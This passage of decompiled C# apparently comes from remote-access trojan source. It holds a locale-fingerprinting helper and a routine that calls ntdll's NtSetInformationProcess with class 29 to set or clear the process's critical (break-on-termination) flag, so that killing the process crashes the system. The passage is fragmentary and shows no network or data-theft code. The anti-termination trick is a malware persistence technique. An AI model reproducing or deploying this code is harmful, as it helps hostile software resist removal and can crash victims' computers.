			int localeInfo = GetLocaleInfo(1024u, 7u, stringBuilder, stringBuilder.Capacity);
			if (localeInfo > 0)
			{
				return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "Unknown";
	}

	[DllImport("ntdll")]
	public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void ED()
	{
		pr(0);
	}
}
